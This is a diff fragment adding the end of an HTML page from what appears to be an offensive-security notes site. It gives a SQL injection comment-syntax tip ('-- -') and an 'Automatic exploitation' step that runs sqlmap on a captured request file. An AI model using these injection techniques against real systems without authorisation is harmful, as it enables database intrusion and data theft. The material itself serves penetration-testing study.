+<li>Use <code>-- -</code> instead of <code>--</code> . In many SQL systems, there must be at least one space after <code>--</code> for the comment to be recognized.</li>
+</ul>
+<hr />
+<h2 id="automatic-exploitation">Automatic exploitation</h2>
+<div class="sourceCode" id="cb13"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="co"># SQL</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="co"># Capture the request (burp/zap) and create a req.txt file</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a><span class="ex">sqlmap</span> <span class="at">-r</span> req.txt</span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
